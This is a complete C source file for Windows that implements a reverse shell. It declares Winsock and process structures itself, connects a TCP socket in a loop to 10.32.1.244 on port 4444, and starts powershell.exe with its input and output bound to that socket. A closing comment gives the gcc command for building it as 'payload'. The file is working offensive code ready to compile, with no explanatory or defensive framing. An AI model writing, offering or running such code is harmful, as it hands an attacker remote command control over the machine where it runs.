struct _SECURITY_ATTRIBUTES {
    unsigned long nLength;
    void* lpSecurityDescriptor;
    int bInheritHandle;
};

struct _STARTUPINFOA {
    unsigned long cb;
    char* lpReserved;
    char* lpDesktop;
    char* lpTitle;
    unsigned long dwX;
    unsigned long dwY;
    unsigned long dwXSize;
    unsigned long dwYSize;
    unsigned long dwXCountChars;
    unsigned long dwYCountChars;
    unsigned long dwFillAttribute;
    unsigned long dwFlags;
    unsigned short wShowWindow;
    unsigned short cbReserved2;
    unsigned char* lpReserved2;
    void* hStdInput;
    void* hStdOutput;
    void* hStdError;
};

struct _PROCESS_INFORMATION {
    void* hProcess;
    void* hThread;
    unsigned long dwProcessId;
    unsigned long dwThreadId;
};

struct WSAData {
    unsigned short wVersion;
    unsigned short wHighVersion;
    unsigned short iMaxSockets;
    unsigned short iMaxUdpDg;
    char *lpVendorInfo;
    char szDescription[257];
    char szSystemStatus[129];
};

struct _GUID {
    unsigned long Data1;
    unsigned short Data2;
    unsigned short Data3;
    unsigned char Data4[8];
};

struct _WSAPROTOCOLCHAIN {
    int ChainLen;
    unsigned long ChainEntries[7];
};

struct _WSAPROTOCOL_INFOA {
    unsigned long dwServiceFlags1;
    unsigned long dwServiceFlags2;
    unsigned long dwServiceFlags3;
    unsigned long dwServiceFlags4;
    unsigned long dwProviderFlags;
    struct _GUID ProviderId;
    unsigned long dwCatalogEntryId;
    struct _WSAPROTOCOLCHAIN ProtocolChain;
    int iVersion;
    int iAddressFamily;
    int iMaxSockAddr;
    int iMinSockAddr;
    int iSocketType;
    int iProtocol;
    int iProtocolMaxOffset;
    int iNetworkByteOrder;
    int iSecurityScheme;
    unsigned long dwMessageSize;
    unsigned long dwProviderReserved;
    char szProtocol[256];
};

struct in_addr {
    union {
        struct { unsigned char  s_b1, s_b2, s_b3, s_b4; } S_un_b;
        struct { unsigned short s_w1, s_w2; } S_un_w;
        unsigned long S_addr;
    } S_un;
};

struct sockaddr_in {
    short sin_family;
    unsigned short sin_port;
    struct in_addr sin_addr;
    char sin_zero[8];
};

struct sockaddr {
    unsigned short sa_family;
    char sa_data[14];
};

__attribute__((dllimport)) int __attribute__((dllimport)) WSAStartup (unsigned short wVersionRequested, struct WSAData* lpWSAData);
__attribute__((dllimport)) unsigned long long __attribute__((dllimport)) WSASocketA (int af, int type, int protocol, struct _WSAPROTOCOL_INFOA* lpProtocolInfo, unsigned int g, unsigned long dwFlags);
__attribute__((dllimport)) unsigned short __attribute__((dllimport)) htons (unsigned short hostshort);
__attribute__((dllimport)) unsigned long __attribute__((dllimport)) inet_addr (const char* cp);
__attribute__((dllimport)) int __attribute__((dllimport)) connect (unsigned long long s, const struct sockaddr *name, int namelen);
void* __attribute__((__cdecl__)) memset(void* _Dst, int _Val, unsigned long long _Size);
__attribute__((dllimport)) int __attribute__((dllimport)) CreateProcessA (const char* lpApplicationName, char* lpCommandLine, struct _SECURITY_ATTRIBUTES* lpProcessAttributes, struct _SECURITY_ATTRIBUTES* lpThreadAttributes, int bInheritHandle, unsigned long dwCreationFlags, void* lpEnvironment, const char* lpCurrentDirectory, struct _STARTUPINFOA* lpStartupInfo, struct _PROCESS_INFORMATION* lpProcessInformation);
__attribute__((dllimport)) unsigned long __attribute__((dllimport)) WaitForSingleObject (void* hHandle, unsigned long dwMilliseconds);

int main() {
    unsigned long long sockfd;
    struct sockaddr_in addr;
    struct WSAData wsa;
    struct _STARTUPINFOA si = {0};
    struct _PROCESS_INFORMATION pi = {0};

    WSAStartup(514, &wsa);
    sockfd = WSASocketA(2, 1, 6, 0, 0, 0);

    addr.sin_family = 2;
    addr.sin_port = htons(4444);
    addr.sin_addr.S_un.S_addr = inet_addr("10.32.1.244");

    while (connect(sockfd, (struct sockaddr*)&addr, 16));

    si.cb = 104;
    si.dwFlags = 257;
    si.hStdInput = si.hStdOutput = si.hStdError = (void*)sockfd;

    CreateProcessA(0, "powershell.exe", 0, 0, 1, 0, 0, 0, &si, &pi);
}

/* Compile
cls; gcc -static -o payload payload.c -lWs2_32; pause; cls; .\payload
*/